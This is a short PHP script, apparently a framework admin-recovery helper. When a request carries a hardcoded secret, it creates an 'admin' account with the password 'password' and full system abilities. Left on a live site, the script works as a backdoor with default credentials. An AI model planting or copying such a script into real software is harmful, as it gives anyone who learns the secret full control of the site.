<?php
defined('D_RUN') or die('Direct access prohibited');

$_REQUEST['secret'] == '874jdiv8' or die();

$new_admin_user = $config->user_manager->new_user();
$new_admin_user->name = 'admin';
$new_admin_user->username = 'admin';
$new_admin_user->password('password');
$new_admin_user->abilities = array('system/all');

$new_admin_user->save();

display_notice('Admin user created.');

?>
